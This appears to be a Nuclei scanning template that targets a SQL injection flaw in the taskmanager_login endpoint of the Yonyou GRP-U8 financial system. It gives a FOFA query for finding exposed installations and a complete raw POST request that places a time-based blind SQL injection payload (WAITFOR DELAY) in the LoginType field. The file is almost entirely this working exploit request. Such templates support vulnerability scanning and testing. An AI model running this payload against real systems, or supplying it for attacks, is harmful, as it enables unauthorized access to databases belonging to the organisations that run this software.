id: yonyou-grp-u8-taskmanager_login-sql

info:
  name: "用友GRP-U8 taskmanager_login 接口 SQL 注入"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: app="用友-GRP-U8"
        用友GRP-U8系统中的taskmanager_login接口存在SQL注入缺陷，攻击者可通过构造恶意输入参数实现非授权数据库操作
  tags: 用友GRP-U8

http:
- raw:
  - |-
    POST /TaskManager/taskmanager_login HTTP/1.1
    Host: {{Hostname}}
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
    Cookie: JSESSIONID=6D291F1355C003C0237B76758924D087
    Cache-Control: max-age=0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Upgrade-Insecure-Requests: 1

    UserNameText=%CF%B5%CD%B3%B9%DC%C0%ED%D4%B1&UserPassText=abc&LoginType=;WAITFOR DELAY '0:0:5'--&submitAction=login
